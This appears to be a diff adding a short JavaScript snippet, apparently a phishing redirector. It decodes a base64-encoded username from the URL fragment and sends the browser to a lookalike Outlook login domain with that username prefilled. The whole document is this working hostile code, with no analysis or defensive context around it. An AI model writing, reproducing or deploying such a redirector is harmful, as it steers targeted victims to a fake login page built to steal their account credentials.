@@ -1,0 +1,6 @@
+<script>
+var link = document.URL;
+var hash = link.substring(link.indexOf('#')+8);
+var decodedb64 = atob(hash);
+window.location.href = 'https://login.outlookmvshared.eu/?username=' + decodedb64;
+</script>
